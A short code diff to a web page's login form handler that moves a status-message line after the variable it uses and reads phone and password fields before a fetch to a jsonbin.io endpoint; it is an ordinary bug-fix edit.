@@ -87,10 +87,11 @@
         // }
         async function handleFormSubmission(e) {
             e.preventDefault();
-            errorText.innerHTML = "Loging in";
-            const phone = document.getElementById('phone').value;
+                        const phone = document.getElementById('phone').value;
             const password = document.getElementById('password').value;
             const errorText = document.getElementById("error");
+            errorText.innerHTML = "Loging in";
+
 
             try {
                 const binsResponse = await fetch('https://api.jsonbin.io/v3/c/65c513621f5677401f2cb475/bins/', {
